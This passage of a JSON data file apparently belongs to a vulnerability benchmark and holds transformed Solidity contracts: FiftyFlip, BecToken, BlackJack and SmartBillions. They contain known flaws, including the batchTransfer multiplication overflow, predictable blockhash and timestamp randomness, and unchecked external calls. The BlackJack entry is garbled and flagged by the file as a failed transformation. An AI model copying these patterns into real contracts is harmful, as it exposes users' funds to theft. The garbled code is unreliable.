uint256(keccak256(abi.encodePacked(blockhash(blockNumber), msg.sender)))%difficulty +1;\nif(winningNumber == difficulty / 2) {\npayout(msg.sender);\n}\nelse {\nloseWager(betLimit / 2);\n}\n}\nelse {\nrevert();\n}\n}\nfunction donate()\nisOpenToPublic()\npublic\npayable {\ndonateToWhale(msg.value);\n}\nfunction payout(address winner)\ninternal {\nuint256 ethToTransfer = address(this).balance / 2;\nwinner.transfer(ethToTransfer);\nemit Win(ethToTransfer, winner);\n}\nfunction donateToWhale(uint256 amount)\ninternal {\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Donate(amount, whale, msg.sender);\n}\nfunction loseWager(uint256 amount)\ninternal {\nwhale.call.value(amount)(bytes4(keccak256(\"donate()\")));\ntotalDonated += amount;\nemit Lose(amount, msg.sender);\n}\nfunction ethBalance()\npublic\nview\nreturns (uint256) {\nreturn address(this).balance;\n}\nfunction currentDifficulty()\npublic\nview\nreturns (uint256) {\nreturn difficulty;\n}\nfunction currentBetLimit()\npublic\nview\nreturns (uint256) {\nreturn betLimit;\n}\nfunction hasPlayerWagered(address player)\npublic\nview\nreturns (bool) {\nif(wagers[player] > 0) {\nreturn true;\n}\nelse {\nreturn false;\n}\n}\nfunction winnersPot()\npublic\nview\nreturns (uint256) {\nreturn address(this).balance / 2;\n}\nfunction transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\npublic\nonlyOwner()\nreturns (bool success) {\nreturn ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n}\n}\ncontract ERC20Interface {\nfunction transfer(address to, uint256 tokens) public returns (bool success);\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 36,
        "mode": "compressed",
        "original_lines": 226,
        "transformed_lines": 160,
        "original_chars": 4648,
        "transformed_chars": 3319,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_216",
      "transformed_id": "ss_l1_compressed_sn_ds_216",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract FiftyFlip {\nuint constant DONATING_X = 20;\nuint constant JACKPOT_FEE = 10;\nuint constant JACKPOT_MODULO = 1000;\nuint constant DEV_FEE = 20;\nuint constant WIN_X = 1900;\nuint constant MIN_BET = 0.01 ether;\nuint constant MAX_BET = 1 ether;\nuint constant BET_EXPIRATION_BLOCKS = 250;\naddress public owner;\naddress public autoPlayBot;\naddress public secretSigner;\naddress private whale;\nuint256 public jackpotSize;\nuint256 public devFeeSize;\nuint256 public lockedInBets;\nuint256 public totalAmountToWhale;\nstruct Bet {\nuint amount;\nuint256 blockNumber;\nbool betMask;\naddress player;\n}\nmapping (uint => Bet) bets;\nmapping (address => uint) donateAmount;\nevent Wager(uint ticketID, uint betAmount, uint256 betBlockNumber, bool betMask, address betPlayer);\nevent Win(address winner, uint amount, uint ticketID, bool maskRes, uint jackpotRes);\nevent Lose(address loser, uint amount, uint ticketID, bool maskRes, uint jackpotRes);\nevent Refund(uint ticketID, uint256 amount, address requester);\nevent Donate(uint256 amount, address donator);\nevent FailedPayment(address paidUser, uint amount);\nevent Payment(address noPaidUser, uint amount);\nevent JackpotPayment(address player, uint ticketID, uint jackpotWin);\nconstructor (address whaleAddress, address autoPlayBotAddress, address secretSignerAddress) public {\nowner = msg.sender;\nautoPlayBot = autoPlayBotAddress;\nwhale = whaleAddress;\nsecretSigner = secretSignerAddress;\njackpotSize = 0;\ndevFeeSize = 0;\nlockedInBets = 0;\ntotalAmountToWhale = 0;\n}\nmodifier onlyOwner() {\nrequire (msg.sender == owner, \"You are not the owner of this contract!\");\n_;\n}\nmodifier onlyBot() {\nrequire (msg.sender == autoPlayBot, \"You are not the bot of this contract!\");\n_;\n}\nmodifier checkContractHealth() {\nrequire (address(this).balance >= lockedInBets + jackpotSize + devFeeSize, \"This contract doesn't have enough balance, it is stopped till someone donate to this game!\");\n_;\n}\nfunction() public payable { }\nfunction setBotAddress(address autoPlayBotAddress)\nonlyOwner()\nexternal {\nautoPlayBot = autoPlayBotAddress;\n}\nfunction setSecretSigner(address _secretSigner)\nonlyOwner()\nexternal {\nsecretSigner = _secretSigner;\n}\nfunction wager(bool bMask, uint ticketID, uint ticketLastBlock, uint8 v, bytes32 r, bytes32 s)\ncheckContractHealth()\nexternal\npayable {\nBet storage bet = bets[ticketID];\nuint amount = msg.value;\naddress player = msg.sender;\nrequire (bet.player == address(0), \"Ticket is not new one!\");\nrequire (amount >= MIN_BET, \"Your bet is lower than minimum bet amount\");\nrequire (amount <= MAX_BET, \"Your bet is higher than maximum bet amount\");\nrequire (getCollateralBalance() >= 2 * amount, \"If we accept this, this contract will be in danger!\");\nrequire (block.number <= ticketLastBlock, \"Ticket has expired.\");\nbytes32 signatureHash = keccak256(abi.encodePacked('\\x19Ethereum Signed Message:\\n37', uint40(ticketLastBlock), ticketID));\nrequire (secretSigner == ecrecover(signatureHash, v, r, s), \"web3 vrs signature is not valid.\");\njackpotSize += amount * JACKPOT_FEE / 1000;\ndevFeeSize += amount * DEV_FEE / 1000;\nlockedInBets += amount * WIN_X / 1000;\nuint donate_amount = amount * DONATING_X / 1000;\nwhale.call.value(donate_amount)(bytes4(keccak256(\"donate()\")));\ntotalAmountToWhale += donate_amount;\nbet.amount = amount;\nbet.blockNumber = block.number;\nbet.betMask = bMask;\nbet.player = player;\nemit Wager(ticketID, bet.amount, bet.blockNumber, bet.betMask, bet.player);\n}\nfunction play(uint ticketReveal)\ncheckContractHealth()\nexternal {\nuint ticketID = uint(keccak256(abi.encodePacked(ticketReveal)));\nBet storage bet = bets[ticketID];\nrequire (bet.player != address(0), \"TicketID is not correct!\");\nrequire (bet.amount != 0, \"Ticket is already used one!\");\nuint256 blockNumber = bet.blockNumber;\nif(blockNumber < block.number && blockNumber >= block.number - BET_EXPIRATION_BLOCKS) {\nuint256 random = uint256(keccak256(abi.encodePacked(blockhash(blockNumber), ticketReveal)));\nbool maskRes = (random % 2) !=0;\nuint jackpotRes = random % JACKPOT_MODULO;\nuint tossWinAmount = bet.amount * WIN_X / 1000;\nuint tossWin = 0;\nuint jackpotWin = 0;\nif(bet.betMask == maskRes) {\ntossWin = tossWinAmount;\n}\nif(jackpotRes == 0) {\njackpotWin = jackpotSize;\njackpotSize = 0;\n}\nif (jackpotWin > 0) {\nemit JackpotPayment(bet.player, ticketID, jackpotWin);\n}\nif(tossWin + jackpotWin > 0) {\npayout(bet.player, tossWin + jackpotWin, ticketID, maskRes, jackpotRes);\n}\nelse {\nloseWager(bet.player, bet.amount, ticketID, maskRes, jackpotRes);\n}\nlockedInBets -= tossWinAmount;\nbet.amount = 0;\n}\nelse {\nrevert();\n}\n}\nfunction donateForContractHealth()\nexternal\npayable {\ndonateAmount[msg.sender] += msg.value;\nemit Donate(msg.value, msg.sender);\n}\nfunction withdrawDonation(uint amount)\nexternal {\nrequire(donateAmount[msg.sender] >= amount, \"You are going to withdraw more than you donated!\");\nif (sendFunds(msg.sender, amount)){\ndonateAmount[msg.sender] -= amount;\n}\n}\nfunction refund(uint ticketID)\ncheckContractHealth()\nexternal {\nBet storage bet = bets[ticketID];\nrequire (bet.amount != 0, \"this ticket has no balance\");\nrequire (block.number > bet.blockNumber + BET_EXPIRATION_BLOCKS, \"this ticket is expired.\");\nsendRefund(ticketID);\n}\nfunction withdrawDevFee(address withdrawAddress, uint withdrawAmount)\nonlyOwner()\ncheckContractHealth()\nexternal {\nrequire (devFeeSize >= withdrawAmount, \"You are trying to withdraw more amount than developer fee.\");\nrequire (withdrawAmount <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\nrequire (devFeeSize <= address(this).balance, \"Not enough funds to withdraw.\");\nif (sendFunds(withdrawAddress, withdrawAmount)){\ndevFeeSize -= withdrawAmount;\n}\n}\nfunction withdrawBotFee(uint withdrawAmount)\nonlyBot()\ncheckContractHealth()\nexternal {\nrequire (devFeeSize >= withdrawAmount, \"You are trying to withdraw more amount than developer fee.\");\nrequire (withdrawAmount <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\nrequire (devFeeSize <= address(this).balance, \"Not enough funds to withdraw.\");\nif (sendFunds(autoPlayBot, withdrawAmount)){\ndevFeeSize -= withdrawAmount;\n}\n}\nfunction getBetInfo(uint ticketID)\nconstant\nexternal\nreturns (uint, uint256, bool, address){\nBet storage bet = bets[ticketID];\nreturn (bet.amount, bet.blockNumber, bet.betMask, bet.player);\n}\nfunction getContractBalance()\nconstant\nexternal\nreturns (uint){\nreturn address(this).balance;\n}\nfunction getCollateralBalance()\nconstant\npublic\nreturns (uint){\nif (address(this).balance > lockedInBets + jackpotSize + devFeeSize)\nreturn address(this).balance - lockedInBets - jackpotSize - devFeeSize;\nreturn 0;\n}\nfunction kill() external onlyOwner() {\nrequire (lockedInBets == 0, \"All bets should be processed (settled or refunded) before self-destruct.\");\nselfdestruct(owner);\n}\nfunction payout(address winner, uint ethToTransfer, uint ticketID, bool maskRes, uint jackpotRes)\ninternal {\nwinner.transfer(ethToTransfer);\nemit Win(winner, ethToTransfer, ticketID, maskRes, jackpotRes);\n}\nfunction sendRefund(uint ticketID)\ninternal {\nBet storage bet = bets[ticketID];\naddress requester = bet.player;\nuint256 ethToTransfer = bet.amount;\nrequester.transfer(ethToTransfer);\nuint tossWinAmount = bet.amount * WIN_X / 1000;\nlockedInBets -= tossWinAmount;\nbet.amount = 0;\nemit Refund(ticketID, ethToTransfer, requester);\n}\nfunction sendFunds(address paidUser, uint amount) private returns (bool){\nbool success = paidUser.send(amount);\nif (success) {\nemit Payment(paidUser, amount);\n} else {\nemit FailedPayment(paidUser, amount);\n}\nreturn success;\n}\nfunction loseWager(address player, uint amount, uint ticketID, bool maskRes, uint jackpotRes)\ninternal {\nemit Lose(player, amount, ticketID, maskRes, jackpotRes);\n}\nfunction clearStorage(uint[] toCleanTicketIDs) external {\nuint length = toCleanTicketIDs.length;\nfor (uint i = 0; i < length; i++) {\nclearProcessedBet(toCleanTicketIDs[i]);\n}\n}\nfunction clearProcessedBet(uint ticketID) private {\nBet storage bet = bets[ticketID];\nif (bet.amount != 0 || block.number <= bet.blockNumber + BET_EXPIRATION_BLOCKS) {\nreturn;\n}\nbet.blockNumber = 0;\nbet.betMask = false;\nbet.player = address(0);\n}\nfunction transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens)\npublic\nonlyOwner()\nreturns (bool success) {\nreturn ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n}\n}\ncontract ERC20Interface {\nfunction transfer(address to, uint256 tokens) public returns (bool success);\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 57,
        "mode": "compressed",
        "original_lines": 354,
        "transformed_lines": 253,
        "original_chars": 11916,
        "transformed_chars": 8458,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_232",
      "transformed_id": "ss_l1_compressed_sn_ds_232",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\nlibrary SafeMath {\nfunction mul(uint256 a, uint256 b) internal constant returns (uint256) {\nuint256 c = a * b;\nrequire(a == 0 || c / a == b);\nreturn c;\n}\nfunction div(uint256 a, uint256 b) internal constant returns (uint256) {\nuint256 c = a / b;\nreturn c;\n}\nfunction sub(uint256 a, uint256 b) internal constant returns (uint256) {\nrequire(b <= a);\nreturn a - b;\n}\nfunction add(uint256 a, uint256 b) internal constant returns (uint256) {\nuint256 c = a + b;\nrequire(c >= a);\nreturn c;\n}\n}\ncontract ERC20Basic {\nuint256 public totalSupply;\nfunction balanceOf(address who) public constant returns (uint256);\nfunction transfer(address to, uint256 value) public returns (bool);\nevent Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\nusing SafeMath for uint256;\nmapping(address => uint256) balances;\nfunction transfer(address _to, uint256 _value) public returns (bool) {\nrequire(_to != address(0));\nrequire(_value > 0 && _value <= balances[msg.sender]);\nbalances[msg.sender] = balances[msg.sender].sub(_value);\nbalances[_to] = balances[_to].add(_value);\nTransfer(msg.sender, _to, _value);\nreturn true;\n}\nfunction balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balances[_owner];\n}\n}\ncontract ERC20 is ERC20Basic {\nfunction allowance(address owner, address spender) public constant returns (uint256);\nfunction transferFrom(address from, address to, uint256 value) public returns (bool);\nfunction approve(address spender, uint256 value) public returns (bool);\nevent Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\nmapping (address => mapping (address => uint256)) internal allowed;\nfunction transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\nrequire(_to != address(0));\nrequire(_value > 0 && _value <= balances[_from]);\nrequire(_value <= allowed[_from][msg.sender]);\nbalances[_from] = balances[_from].sub(_value);\nbalances[_to] = balances[_to].add(_value);\nallowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\nTransfer(_from, _to, _value);\nreturn true;\n}\nfunction approve(address _spender, uint256 _value) public returns (bool) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}\nfunction allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\n}\ncontract Ownable {\naddress public owner;\nevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\nfunction Ownable() {\nowner = msg.sender;\n}\nmodifier onlyOwner() {\nrequire(msg.sender == owner);\n_;\n}\nfunction transferOwnership(address newOwner) onlyOwner public {\nrequire(newOwner != address(0));\nOwnershipTransferred(owner, newOwner);\nowner = newOwner;\n}\n}\ncontract Pausable is Ownable {\nevent Pause();\nevent Unpause();\nbool public paused = false;\nmodifier whenNotPaused() {\nrequire(!paused);\n_;\n}\nmodifier whenPaused() {\nrequire(paused);\n_;\n}\nfunction pause() onlyOwner whenNotPaused public {\npaused = true;\nPause();\n}\nfunction unpause() onlyOwner whenPaused public {\npaused = false;\nUnpause();\n}\n}\ncontract PausableToken is StandardToken, Pausable {\nfunction transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\nreturn super.transfer(_to, _value);\n}\nfunction transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\nreturn super.transferFrom(_from, _to, _value);\n}\nfunction approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\nreturn super.approve(_spender, _value);\n}\nfunction batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {\nuint cnt = _receivers.length;\nuint256 amount = uint256(cnt) * _value;\nrequire(cnt > 0 && cnt <= 20);\nrequire(_value > 0 && balances[msg.sender] >= amount);\nbalances[msg.sender] = balances[msg.sender].sub(amount);\nfor (uint i = 0; i < cnt; i++) {\nbalances[_receivers[i]] = balances[_receivers[i]].add(_value);\nTransfer(msg.sender, _receivers[i], _value);\n}\nreturn true;\n}\n}\ncontract BecToken is PausableToken {\nstring public name = \"BeautyChain\";\nstring public symbol = \"BEC\";\nstring public version = '1.0.0';\nuint8 public decimals = 18;\nfunction BecToken() {\ntotalSupply = 7000000000 * (10**(uint256(decimals)));\nbalances[msg.sender] = totalSupply;\n}\nfunction () {\nrevert();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 43,
        "mode": "compressed",
        "original_lines": 186,
        "transformed_lines": 142,
        "original_chars": 5234,
        "transformed_chars": 4446,
        "compression_ratio": 0.85
      },
      "error": null
    },
    {
      "original_id": "sn_ds_233",
      "transformed_id": "ss_l1_compressed_sn_ds_233",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": false,
      "code": "pragma solidity ^0.4.9;\nlibrary Deck {\nfunction deal(address player, uint8 cardNumber) internal returns (uint8) {\nuint b = block.number;\nuint timestamp = block.timestamp;\nreturn uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);\n}\nfunction valueOf(uint8 card, bool isBigAce) internal constant returns (uint8) {\nuint8 value = card / 4;\nif (value == 0 || value == 11 || value == 12) {\nreturn 10;\n}\nif (value == 1 && isBigAce) {\nreturn 11;\n}\nreturn value;\n}\nfunction isAce(uint8 card) internal constant returns (bool) {\nreturn card / 4 == 1;\n}\nfunction isTen(uint8 card) internal constant returns (bool) {\nreturn card / 4 == 10;\n}\n}\ncontract BlackJack {\nusing Deck for *;\nuint public minBet = 50 finney;\nuint public maxBet = 5 ether;\nuint8 BLACKJACK = 21;\nenum GameState { Ongoing, Player, Tie, House }\nstruct Game {\naddress player; t bet; // \u0441\u0442\u044bhouseCards; // \u043a\u0430\u0440\u0442\u044b \u0434\u0438\u043b// \u043a\u0430\u0440\u0442\u044b \u0438\u0433\u0440\u043e\u043a\u0430\nGameS uint8 cardsDealt;\n}> Game) public games;\nmodifier gameIsGoingOn() {\nif (games[msg.sender].player == 0 || games[msg.sender].state != GameState.Ongoing) {\nthrow; // game doesn't exist or already finished\ner,\nuint8 _card\n);\nevent GameStatus(\nuint8 houseScore,\nuint8 houseScoreBig,\nuint8 playerScore,\nuint8 playerScoreBig\n);\nevent Log(\nuint8 value\n);\nfunction BlackJack() {\n}\nfunction () payable {\n}\n// starts a new game\nfunction deal() publices[msg.sender].player != 0 && games[msg.sender].state == GameState.Ongoing) {\nthrow; // game is already going on\n}\nif (msg.v> maxBet) {\nthrow; // incorrect bet\n}\nuint8[] memory house8[](1);\nuint8[] memory playerCards = new uint8[](2);\n// deal the cards\nplayerCards[0] = Deck.de;\nDeal(true, playerCards[0]);\nhouseCards[0] = Deck.deal(msg.sender, 1);\nDeal(false, houseCards[0]);\nplayerCards[1] = Deck.deal(msg.sender, 2);\nDeal(true, playerCards[1]);\ngames[msg.sender] = Game({\nplayer: msg.sender,\nbet: msg.value,\nhouseCards: houseCards,\nplayerCards: playerCards,\nstate: GameState.Ongoing,\ncardsDealt: 3\n});\ncheckGameResult(games[msg.sender], false);\n}\n// deals one more card to the player\nfunctint8 nextCard = games[msg.sender].cardsDealt;\ngames[msg.sender].playerCards.push(Deck.deal(msg.sender, nextCard));\ngames[msg.sender].cardsDealt = nextCard + 1;\nDeal(true, games[msg.sender].playerCards[games[msg.sender].playerCards.length - 1]);\ncheckGameResult(games[msg.sender], false);\n}\n// finishes the game\nfunction stand() publi var (houseScore, houseScoreBig) = calculateScore(games[msg.sender].houseCards);\nwhile (houseScoreBig < 17) {\nuint8 nextCard = games[msg.sender].cardsDealt;\nuint8 newCard = Deck.deal(msg.sender, nextCard);\ngames[msg.sender].houseCards.push(newCard);\ngames[msg.sender].cardsDealt = nextCard + 1;\nhouseScoreBig += Deck.valueOf(newCard, true);\nDeal(false, newCard);\n}\ncheckGameResult(games[msg.sender], true);\n}\n// @param finishGame - whether to finish theinishGame) private {\n// calculate house score\nvar (houseScore, teScore(game.houseCards);\n// calculate player score\nvar (playerScorelateScore(game.playerCards);\nGameStatus(houseScore, houseScoreBig, playerScore, playerScoreBig);\nif (houseScoreBig == BLACKJACK || houseScore == BLACKJACK) {\nif (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {\n// TIE\nif (!msg.sender.send(game.bet)) t// return bet to the player\ngames[msg.se; // finish the game\nreturn;\n} else {\ngames[msg.sender].state = Gse; // simply finish the game\nreturn;\n}\nore == BLACKJACK || playerScoreBig == BLACKJACK) {\n// PLAYER WON\nif (game.playerCards.lengtck.isTen(game.playerCards[0]) || Deck.isTen(game.playerCards[1]))) {\n// Natural blackjack => return x2.5\nif 2)) throw; // send prize to the player\n} else {\nurn x2\nif (!msrow; // send prize to the player\n}\ngames[te.Player; // finish the game\nreturn;\n} else {\ne > BLACKJACK) {\n// BUST, HOUSE WON\nLog(1);\ngames[m GameState.House; // finish the game\nreturn;\n}\ni return; // continue the game\n}\nplayerShortage = 0;\nage = 0;\n// player decided to finish the game\nif (playeryerScore > BLACKJACK) {\n// HOUSE WON\ngames[msg.sender].state = GameSt/ simply finish the game\nreturn;\n} else BLACKJACK - playerScore;\n}\n} else {\nplayerShortage = BLACKJACK - playerScoreBig;\n}\nif (houseScoreBig > BLACKJACK) {\nif (houseScore > BLACKJACK) {\n// PLAYER WON\nif (!msg.sender.send(game.bet */ send prize to the player\ngames[msg.sender] return;\n} else {\nhouseShortage = BLACKJACK - houseScore;\n}\n} else {\nhouseShortage = BLACKJACK - houseScoreBig;\n}\n// ?????????????????????? \u043f\u043e\u0447\u0435\u043c\u0443 \u0438\u0433\u0440\u0430 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044fer.send(game.bet)) throw; // return bet to the pl games[msg.sender].state = GameState.Tie;\ne > playerShortage) {\n// PLAYER WON\nif (!msg.sender.send(game.bet * 2)) throw; // send prizer\ngames[msg.sender].state = GameState.Playemsg.sender].state = GameState.House;\n}\n}\n}\n}\nfunction calculateScore(uint8[] cards) private constant returns (uint8, uint8) {\nuint8 score = 0;\nuint8 scoreBig = 0; // in case of Ace there could be 2 different scores\nbool bigAceUsed = fa uint8 card = cards[i];\nif (Deck.isAce(card) && !bigAceUsed) { // doesn't make sense to use the second Ace as 11, because it leads to thee {\nscoreBig += Deck.valueOf(card, false);\n}\nscore += Deck.valueOf(card, false);\n}\nreturn (score, scoreBig);\n}\nfunction getPlayerCard(uint8 id) public gameIsGoingOn constant returns(uint8) {\nif (id < 0 || id > games[msg.sender].playerCards.length) {\nthrow;\n}\nreturn games[msg.sender].playerCards[id];\n}\nfunction getHouseCard(uint8 id) public gameIsGoingOn constant returns(uint8) {\nif (id < 0 || id > games[msg.sender].houseCards.length) {\nthrow;\n}\nreturn games[msg.sender].houseCards[id];\n}\nfunction getPlayerCardsNumber() public gameIsGoingOn constant returns(uint) {\nreturn games[msg.sender].playerCards.length;\n}\nfunction getHouseCardsNumber() public gameIsGoingOn constant returns(uint) {\nreturn games[msg.sender].houseCards.length;\n}\nfunction getGameState() public constant returns (uint8) {\nif (games[msg.sender].player == 0) {\nthrow; // game doesn't exist\n}\nGame game = games[msg.sender];\nif (game.ster) {\nreturn 1;\n}\nif (game.state == GameState.House) {\nreturn 2;\n}\nif (game.state == GameState.Tie) {\nreturn 3;\n}\nreturn 0; // the game is still going on\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 48,
        "mode": "compressed",
        "original_lines": 298,
        "transformed_lines": 212,
        "original_chars": 8210,
        "transformed_chars": 6103,
        "compression_ratio": 0.74
      },
      "error": "Syntax errors after transformation: ['Syntax error at line 33, column 7', 'Syntax error at line 34, column 2', 'Syntax error at line 34, column 8']"
    },
    {
      "original_id": "sn_ds_234",
      "transformed_id": "ss_l1_compressed_sn_ds_234",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.13;\nlibrary SafeMath {\nfunction sub(uint a, uint b) internal returns (uint) {\nassert(b <= a);\nreturn a - b;\n}\nfunction add(uint a, uint b) internal returns (uint) {\nuint c = a + b;\nassert(c >= a);\nreturn c;\n}\n}\ncontract ERC20Basic {\nuint public totalSupply;\naddress public owner;\naddress public animator;\nfunction balanceOf(address who) constant returns (uint);\nfunction transfer(address to, uint value);\nevent Transfer(address indexed from, address indexed to, uint value);\nfunction commitDividend(address who) internal;\n}\ncontract ERC20 is ERC20Basic {\nfunction allowance(address owner, address spender) constant returns (uint);\nfunction transferFrom(address from, address to, uint value);\nfunction approve(address spender, uint value);\nevent Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract BasicToken is ERC20Basic {\nusing SafeMath for uint;\nmapping(address => uint) balances;\nmodifier onlyPayloadSize(uint size) {\nassert(msg.data.length >= size + 4);\n_;\n}\nfunction transfer(address _to, uint _value) onlyPayloadSize(2 * 32) {\ncommitDividend(msg.sender);\nbalances[msg.sender] = balances[msg.sender].sub(_value);\nif(_to == address(this)) {\ncommitDividend(owner);\nbalances[owner] = balances[owner].add(_value);\nTransfer(msg.sender, owner, _value);\n}\nelse {\ncommitDividend(_to);\nbalances[_to] = balances[_to].add(_value);\nTransfer(msg.sender, _to, _value);\n}\n}\nfunction balanceOf(address _owner) constant returns (uint balance) {\nreturn balances[_owner];\n}\n}\ncontract StandardToken is BasicToken, ERC20 {\nmapping (address => mapping (address => uint)) allowed;\nfunction transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) {\nvar _allowance = allowed[_from][msg.sender];\ncommitDividend(_from);\ncommitDividend(_to);\nbalances[_to] = balances[_to].add(_value);\nbalances[_from] = balances[_from].sub(_value);\nallowed[_from][msg.sender] = _allowance.sub(_value);\nTransfer(_from, _to, _value);\n}\nfunction approve(address _spender, uint _value) {\nassert(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\n}\nfunction allowance(address _owner, address _spender) constant returns (uint remaining) {\nreturn allowed[_owner][_spender];\n}\n}\ncontract SmartBillions is StandardToken {\nstring public constant name = \"SmartBillions Token\";\nstring public constant symbol = \"PLAY\";\nuint public constant decimals = 0;\nstruct Wallet {\nuint208 balance;\nuint16 lastDividendPeriod;\nuint32 nextWithdrawBlock;\n}\nmapping (address => Wallet) wallets;\nstruct Bet {\nuint192 value;\nuint32 betHash;\nuint32 blockNum;\n}\nmapping (address => Bet) bets;\nuint public walletBalance = 0;\nuint public investStart = 1;\nuint public investBalance = 0;\nuint public investBalanceMax = 200000 ether;\nuint public dividendPeriod = 1;\nuint[] public dividends;\nuint public maxWin = 0;\nuint public hashFirst = 0;\nuint public hashLast = 0;\nuint public hashNext = 0;\nuint public hashBetSum = 0;\nuint public hashBetMax = 5 ether;\nuint[] public hashes;\nuint public constant hashesSize = 16384 ;\nuint public coldStoreLast = 0 ;\nevent LogBet(address indexed player, uint bethash, uint blocknumber, uint betsize);\nevent LogLoss(address indexed player, uint bethash, uint hash);\nevent LogWin(address indexed player, uint bethash, uint hash, uint prize);\nevent LogInvestment(address indexed investor, address indexed partner, uint amount);\nevent LogRecordWin(address indexed player, uint amount);\nevent LogLate(address indexed player,uint playerBlockNumber,uint currentBlockNumber);\nevent LogDividend(address indexed investor, uint amount, uint period);\nmodifier onlyOwner() {\nassert(msg.sender == owner);\n_;\n}\nmodifier onlyAnimator() {\nassert(msg.sender == animator);\n_;\n}\nfunction SmartBillions() {\nowner = msg.sender;\nanimator = msg.sender;\nwallets[owner].lastDividendPeriod = uint16(dividendPeriod);\ndividends.push(0);\ndividends.push(0);\n}\nfunction hashesLength() constant external returns (uint) {\nreturn uint(hashes.length);\n}\nfunction walletBalanceOf(address _owner) constant external returns (uint) {\nreturn uint(wallets[_owner].balance);\n}\nfunction walletPeriodOf(address _owner) constant external returns (uint) {\nreturn uint(wallets[_owner].lastDividendPeriod);\n}\nfunction walletBlockOf(address _owner) constant external returns (uint) {\nreturn uint(wallets[_owner].nextWithdrawBlock);\n}\nfunction betValueOf(address _owner) constant external returns (uint) {\nreturn uint(bets[_owner].value);\n}\nfunction betHashOf(address _owner) constant external returns (uint) {\nreturn uint(bets[_owner].betHash);\n}\nfunction betBlockNumberOf(address _owner) constant external returns (uint) {\nreturn uint(bets[_owner].blockNum);\n}\nfunction dividendsBlocks() constant external returns (uint) {\nif(investStart > 0) {\nreturn(0);\n}\nuint period = (block.number - hashFirst) / (10 * hashesSize);\nif(period > dividendPeriod) {\nreturn(0);\n}\nreturn((10 * hashesSize) - ((block.number - hashFirst) % (10 * hashesSize)));\n}\nfunction changeOwner(address _who) external onlyOwner {\nassert(_who != address(0));\ncommitDividend(msg.sender);\ncommitDividend(_who);\nowner = _who;\n}\nfunction changeAnimator(address _who) external onlyAnimator {\nassert(_who != address(0));\ncommitDividend(msg.sender);\ncommitDividend(_who);\nanimator = _who;\n}\nfunction setInvestStart(uint _when) external onlyOwner {\nrequire(investStart == 1 && hashFirst > 0 && block.number < _when);\ninvestStart = _when;\n}\nfunction setBetMax(uint _maxsum) external onlyOwner {\nhashBetMax = _maxsum;\n}\nfunction resetBet() external onlyOwner {\nhashNext = block.number + 3;\nhashBetSum = 0;\n}\nfunction coldStore(uint _amount) external onlyOwner {\nhouseKeeping();\nrequire(_amount > 0 && this.balance >= (investBalance * 9 / 10) + walletBalance + _amount);\nif(investBalance >= investBalanceMax / 2){\nrequire((_amount <= this.balance / 400) && coldStoreLast + 4 * 60 * 24 * 7 <= block.number);\n}\nmsg.sender.transfer(_amount);\ncoldStoreLast = block.number;\n}\nfunction hotStore() payable external {\nhouseKeeping();\n}\nfunction houseKeeping() public {\nif(investStart > 1 && block.number >= investStart + (hashesSize * 5)){\ninvestStart = 0;\n}\nelse {\nif(hashFirst > 0){\nuint period = (block.number - hashFirst) / (10 * hashesSize );\nif(period > dividends.length - 2) {\ndividends.push(0);\n}\nif(period > dividendPeriod && investStart == 0 && dividendPeriod < dividends.length - 1) {\ndividendPeriod++;\n}\n}\n}\n}\nfunction payWallet() public {\nif(wallets[msg.sender].balance > 0 && wallets[msg.sender].nextWithdrawBlock <= block.number){\nuint balance = wallets[msg.sender].balance;\nwallets[msg.sender].balance = 0;\nwalletBalance -= balance;\npay(balance);\n}\n}\nfunction pay(uint _amount) private {\nuint maxpay = this.balance / 2;\nif(maxpay >= _amount) {\nmsg.sender.transfer(_amount);\nif(_amount > 1 finney) {\nhouseKeeping();\n}\n}\nelse {\nuint keepbalance = _amount - maxpay;\nwalletBalance += keepbalance;\nwallets[msg.sender].balance += uint208(keepbalance);\nwallets[msg.sender].nextWithdrawBlock = uint32(block.number + 4 * 60 